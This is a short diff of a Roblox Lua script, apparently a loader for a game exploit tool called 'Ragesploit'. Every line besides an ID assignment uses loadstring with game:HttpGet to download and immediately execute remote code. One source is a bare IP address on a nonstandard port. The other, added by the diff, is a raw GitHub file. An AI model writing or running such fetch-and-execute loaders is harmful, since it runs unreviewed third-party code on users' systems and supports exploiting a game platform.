@@ -1,2 +1,3 @@
 ID="7c2f5912-a1cd-4b56-a60a-622da07cc740";
 loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ragesploit-x/Ragesploit/refs/heads/main/MainScript/ShitVersion.lua"))()
